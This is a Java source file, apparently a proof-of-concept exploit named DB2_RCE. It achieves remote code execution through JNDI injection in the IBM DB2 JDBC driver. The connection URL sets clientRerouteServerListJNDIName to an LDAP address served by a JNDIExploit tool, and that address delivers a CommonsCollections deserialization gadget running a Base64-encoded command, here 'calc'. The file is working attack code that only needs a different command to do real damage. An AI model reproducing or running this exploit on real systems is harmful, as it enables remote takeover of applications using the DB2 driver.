package org.example;

import java.sql.Connection;
import java.sql.DriverManager;

// Test in Windows
// Oracle Java 8
// java8 -jar JNDIExploit-1.3-SNAPSHOT.jar -i 192.168.20.130 -l 1234
public class DB2_RCE {
    public static void main(String[] args) throws Exception {
        String driver = "com.ibm.db2.jcc.DB2Driver";
        String Payload_url = "ldap://192.168.20.130:1234/Deserialization/CommonsCollectionsK1/Command/Base64/Y2FsYw==";
        String DB_URL = "jdbc:db2://127.0.0.1:50000/BLUDB:clientRerouteServerListJNDIName=" + Payload_url + ";";
        System.out.println(DB_URL);
        Class.forName(driver);
        Connection conn = DriverManager.getConnection(DB_URL);
        conn.close();
    }
}
